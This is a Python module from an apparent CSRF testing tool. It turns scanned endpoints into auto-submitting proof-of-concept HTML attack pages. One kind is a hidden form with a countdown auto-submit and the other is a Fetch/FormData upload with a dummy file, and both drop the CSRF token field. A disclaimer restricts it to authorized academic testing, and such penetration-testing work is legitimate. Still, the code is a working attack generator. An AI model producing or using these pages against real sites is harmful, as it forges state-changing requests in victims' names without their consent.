"""
modules/poc_generator.py
─────────────────────────
Generates auto-submitting CSRF Proof-of-Concept HTML pages.

⚠  FOR AUTHORIZED ACADEMIC TESTING ONLY ⚠

Two variants:
  post       → hidden <form> + JavaScript countdown auto-submit
  multipart  → Fetch API + FormData + dummy Blob (file upload PoC)

Templates are loaded from templates/ at the project root.
Variable syntax: {{ VARIABLE_NAME }} — no external library needed.
"""

from __future__ import annotations

import logging
import os
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Optional
from urllib.parse import urlparse

from core.endpoint_classifier import ClassifiedEndpoint

log = logging.getLogger(__name__)

_PROJECT_ROOT      = Path(__file__).parent.parent
TEMPLATE_POST      = _PROJECT_ROOT / "templates" / "csrf_poc_post.html"
TEMPLATE_MULTIPART = _PROJECT_ROOT / "templates" / "csrf_poc_multipart.html"


@dataclass
class PoCResult:
    """Metadata for one generated PoC file."""
    endpoint_url:   str
    method:         str
    poc_type:       str   # "post" | "multipart"
    output_path:    str
    filename:       str
    is_file_upload: bool
    field_count:    int
    disclaimer:     str = "FOR AUTHORIZED ACADEMIC TESTING ONLY"


@dataclass
class PoCReport:
    """Summary of a full PoC generation run."""
    output_dir: str
    generated:  list[PoCResult] = field(default_factory=list)
    skipped:    list[str]       = field(default_factory=list)

    @property
    def total(self) -> int:
        return len(self.generated)


class PoCGenerator:
    """
    Renders CSRF PoC HTML files from templates using plain string replacement.

    post:      has_file_upload=False → hidden form auto-submit
    multipart: has_file_upload=True  → Fetch + FormData + dummy Blob
    """

    def __init__(self, output_dir: str = "poc_output") -> None:
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)
        self._tpl_post      = self._load(TEMPLATE_POST)
        self._tpl_multipart = self._load(TEMPLATE_MULTIPART)

    def generate_all(self, endpoints: list[ClassifiedEndpoint]) -> PoCReport:
        """Generate a PoC for every state-changing endpoint."""
        report = PoCReport(output_dir=self.output_dir)
        log.debug("PoC output dir: %s", os.path.abspath(self.output_dir))

        for idx, ep in enumerate(endpoints):
            if not ep.is_state_changing:
                report.skipped.append(ep.url)
                continue
            result = self._render(ep, idx)
            if result:
                report.generated.append(result)
                log.debug("[+] %s  (%s)", result.filename, result.poc_type)

        return report

    def _render(self, ep: ClassifiedEndpoint, index: int) -> Optional[PoCResult]:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        slug      = self._slugify(ep.url)

        if ep.has_file_upload:
            filename = f"csrf_poc_{slug}_{index}_multipart.html"
            html     = self._fill_multipart(ep, timestamp)
            poc_type = "multipart"
        else:
            filename = f"csrf_poc_{slug}_{index}.html"
            html     = self._fill_post(ep, timestamp)
            poc_type = "post"

        path = os.path.join(self.output_dir, filename)
        Path(path).write_text(html, encoding="utf-8")
        return PoCResult(endpoint_url=ep.url, method=ep.method, poc_type=poc_type,
                         output_path=path, filename=filename,
                         is_file_upload=ep.has_file_upload, field_count=len(ep.inputs))

    def _fill_post(self, ep: ClassifiedEndpoint, timestamp: str) -> str:
        return (self._tpl_post
                .replace("{{ TARGET_URL }}", ep.url)
                .replace("{{ TIMESTAMP }}", timestamp)
                .replace("{{ FORM_FIELDS }}", self._hidden_inputs(ep)))

    def _fill_multipart(self, ep: ClassifiedEndpoint, timestamp: str) -> str:
        text_js, file_js, file_names = self._formdata_js(ep)
        return (self._tpl_multipart
                .replace("{{ TARGET_URL }}", ep.url)
                .replace("{{ TIMESTAMP }}", timestamp)
                .replace("{{ FILE_FIELD_NAMES }}", file_names)
                .replace("{{ JS_TEXT_FIELDS }}", text_js)
                .replace("{{ JS_FILE_FIELDS }}", file_js))

    def _hidden_inputs(self, ep: ClassifiedEndpoint) -> str:
        lines = []
        for inp in ep.inputs:
            name  = self._esc_html(inp.get("name", ""))
            value = self._esc_html(inp.get("value", ""))
            ftype = inp.get("type", "text").lower()
            if not name or ftype in ("submit", "button", "image", "reset", "file"):
                continue
            if ep.csrf_token_field and name == ep.csrf_token_field:
                lines.append(f'      <!-- ⚠ CSRF token field absent (name="{name}") -->')
                continue
            lines.append(f'      <input type="hidden" name="{name}" value="{value}">')
        return "\n".join(lines) or "      <!-- no injectable fields -->"

    def _formdata_js(self, ep: ClassifiedEndpoint) -> tuple[str, str, str]:
        text_lines: list[str] = []
        file_lines:  list[str] = []
        file_names:  list[str] = []
        for inp in ep.inputs:
            name  = inp.get("name", "")
            value = inp.get("value", "")
            ftype = inp.get("type", "text").lower()
            if not name or ftype in ("submit", "button", "image", "reset"):
                continue
            if ep.csrf_token_field and name == ep.csrf_token_field:
                text_lines.append(f'        // ⚠ CSRF token omitted: "{self._esc_js(name)}"')
                continue
            if ftype == "file":
                file_names.append(name)
                file_lines.append(
                    f'        // dummy Blob — real file contents blocked by SOP\n'
                    f'        fd.append("{self._esc_js(name)}", new Blob([""]), "dummy.txt");'
                )
            else:
                text_lines.append(
                    f'        fd.append("{self._esc_js(name)}", "{self._esc_js(value)}");'
                )
        return (
            "\n".join(text_lines) or "        // (no text fields)",
            "\n".join(file_lines) or "        // (no file fields)",
            ", ".join(file_names) or "none detected",
        )

    @staticmethod
    def _load(path: Path) -> str:
        if not path.exists():
            raise FileNotFoundError(
                f"PoC template missing: {path}\n"
                "Ensure templates/ exists in the project root."
            )
        return path.read_text(encoding="utf-8")

    @staticmethod
    def _slugify(url: str) -> str:
        p   = urlparse(url)
        raw = (p.netloc + p.path).replace("/", "_").replace(".", "_")
        return raw[:40].strip("_") or "endpoint"

    @staticmethod
    def _esc_html(v: str) -> str:
        return v.replace("&", "&amp;").replace('"', "&quot;").replace("<", "&lt;").replace(">", "&gt;")

    @staticmethod
    def _esc_js(v: str) -> str:
        return v.replace("\\", "\\\\").replace('"', '\\"').replace("'", "\\'").replace("\n", "\\n")
